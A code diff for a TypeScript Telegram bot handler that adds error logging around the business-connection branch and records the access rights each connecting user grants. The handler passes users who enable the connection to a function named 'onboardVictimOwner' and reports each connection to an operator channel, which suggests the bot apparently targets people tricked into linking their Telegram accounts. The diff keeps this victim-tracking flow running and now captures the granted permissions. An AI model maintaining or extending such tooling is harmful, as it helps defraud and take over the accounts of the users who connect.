@@ -1,5 +1,6 @@
 import { config } from "./config.js";
-import { formatUser, logTopic } from "./log.js";
+import { describeUpdate } from "./errors.js";
+import { formatUser, logError, logTopic } from "./log.js";
 import { sendStartMedia } from "./media.js";
 import {
   buildHowMessage,
@@ -87,12 +88,23 @@ export async function handleTelegramUpdate(update: Update): Promise<void> {
       updatedAt: new Date().toISOString(),
     });
 
-    if (bc.is_enabled) {
-      const ownerChat = bc.user_chat_id ?? bc.user.id;
-      await onboardVictimOwner(bc.id, ownerChat, bc.user);
-      await logTopic("connections", `🔌 подключение\n${formatUser(bc.user)}\nbc <code>${bc.id}</code>`);
-    } else {
-      await logTopic("connections", `⛔ отключение\n${formatUser(bc.user)}`);
+    try {
+      if (bc.is_enabled) {
+        const ownerChat = bc.user_chat_id ?? bc.user.id;
+        await onboardVictimOwner(bc.id, ownerChat, bc.user);
+        await logTopic(
+          "connections",
+          `🔌 подключение\n${formatUser(bc.user)}\nbc <code>${bc.id}</code>\nrights <code>${bc.rights ? JSON.stringify(bc.rights) : "—"}</code>`,
+        );
+      } else {
+        await logTopic("connections", `⛔ отключение\n${formatUser(bc.user)}`);
+      }
+    } catch (e) {
+      await logError("business_connection_handler", e, {
+        bc_id: bc.id,
+        user_id: bc.user.id,
+        enabled: bc.is_enabled,
+      });
     }
     return;
   }
@@ -154,8 +166,7 @@ export async function handleTelegramUpdateSafe(update: Update): Promise<void> {
   try {
     await handleTelegramUpdate(update);
   } catch (e) {
-    const err = e instanceof Error ? e.message : String(e);
-    console.error(err);
-    await logTopic("errors", `bot handler\n${err}`).catch(() => undefined);
+    console.error(e);
+    await logError("telegram_update_handler", e, describeUpdate(update)).catch(() => undefined);
   }
 }
